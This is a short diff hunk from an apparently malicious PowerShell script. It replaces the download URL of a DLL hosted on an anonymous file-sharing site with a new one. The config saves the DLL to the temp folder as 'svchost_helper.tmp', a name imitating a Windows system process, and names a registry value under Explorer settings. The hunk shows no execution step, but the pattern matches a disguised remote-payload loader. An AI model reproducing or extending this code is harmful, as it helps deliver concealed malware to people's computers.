@@ -7,7 +7,7 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # ===== Config =====
- $dllUrl     = "https://files.catbox.moe/qa7670.dll"
+ $dllUrl     = "https://files.catbox.moe/3eewvo.dll"
  $tempDll    = "$env:TEMP\svchost_helper.tmp"
  $regBackup  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\People"
  $regValue   = "TaskbarContacts"
